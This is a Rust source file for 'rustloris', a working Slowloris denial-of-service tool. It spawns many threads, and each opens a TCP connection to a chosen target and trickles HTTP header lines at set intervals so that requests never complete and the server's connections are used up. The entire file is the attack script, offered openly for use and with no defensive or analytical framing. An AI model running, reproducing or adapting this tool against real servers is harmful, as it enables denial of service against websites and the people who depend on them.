extern crate rustc_serialize;
extern crate docopt;

use std::net;
use std::io;
use std::io::Write;
use std::thread::sleep;
use std::time;
use std::error::Error;
use std::str::FromStr;
use std::process::exit;
use std::thread::{spawn,JoinHandle};
use docopt::Docopt;

const USAGE: &'static str = "
rustloris

Usage:
    rustloris [options] <target>

Options:
    -h --help                       Show this screen.
    --attack-header=<hdr>           Header to send repeadetly [default: Cookie: a=b].
    --interval=<interval>           Number of seconds to wait between sending [default: 5].
    --connections=<connections>     Number of concurrent connections [default: 10].
";

fn print_usage_and_exit<T :Error>(e :T) -> ! {
    print!("{}", e);
    exit(1)
}

#[derive(Debug, RustcDecodable)]
struct Arguments {
    arg_target :String,
    flag_attack_header :String,
    flag_interval :u64,
    flag_connections :u64,
}

#[derive(Debug,Clone)]
struct AttackOptions {
    connections: u64,
    interval: time::Duration,
    header :String, // The whole HTTP header except the attack header
    attack_header :String,
    target :net::SocketAddr,
}

// This should be done using TryFrom trait, but it is not available in the version I currently have
fn args_to_attack_opts(args :Arguments) -> Result<AttackOptions, net::AddrParseError> {
    let target = try!(net::SocketAddr::from_str(args.arg_target.as_str()));
    let interval = time::Duration::from_secs(args.flag_interval);

    Result::Ok(AttackOptions{
        target: target,
        attack_header: args.flag_attack_header.clone(),
        interval: interval,
        header: construct_header(&args),
        connections: args.flag_connections,
    })
}

// Kinda pointless for, but turn AttackOptions.target to a proper URL later (it shouldn't contain
// the port number as it currently does). Make it possible to add custom HTTP headers as well
fn construct_header(args :&Arguments) -> String {
    format!("GET {} HTTP/1.1\r\nHost: {}\r\n{}", "/", args.arg_target.as_str(), "")
}


fn slowloris(opts :AttackOptions) -> io::Result<()> {
    let mut stream = try!(net::TcpStream::connect(opts.target));
    try!(stream.write_all(opts.header.as_str().as_bytes()));

    loop {
        let hdr = format!("{}\r\n", opts.attack_header.as_str());
        try!(stream.write_all(hdr.as_bytes()));
        sleep(opts.interval)
    }
}

fn main() {
    let args :Arguments = Docopt::new(USAGE)
        .and_then(|d| d.decode())
        .unwrap_or_else(|e| print_usage_and_exit(e));

    let opts = args_to_attack_opts(args)
        .unwrap_or_else(|e| print_usage_and_exit(e));

    let mut handles = vec![];
    for i in 0..opts.connections {
        let opts = opts.clone();

        let h = spawn(move || {
            slowloris(opts);
        });
        handles.push(h)
    }

    println!("Succesfully spawned {} attack threads. ", opts.connections);

    for h in handles {
        h.join();
    }
}
